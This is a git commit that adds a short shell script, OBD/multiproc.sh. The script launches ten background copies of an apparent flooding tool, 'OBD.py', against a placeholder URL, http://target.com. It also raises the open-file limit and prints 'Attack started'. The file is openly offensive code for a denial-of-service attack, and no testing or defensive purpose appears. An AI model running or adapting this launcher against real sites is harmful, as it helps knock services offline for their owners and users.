5299c2c0294f1fb9ff6ff4250d81e5c94e6ce14c
Nirix <64707234+Nirix121@users.noreply.github.com>
2022-05-09 20:49:44 +0300

    Add files via upload

---
+++ OBD/multiproc.sh
@@ -0,0 +1,14 @@
+
+atk_cmd="python3 OBD.py -url http://target.com -v 4 -s 60"
+
+process=10
+
+
+ulimit -n 999999
+
+echo Attack started
+for ((i=1;i<=$process;i++))
+do
+  $atk_cmd >/dev/null &
+  sleep 0.1
+done
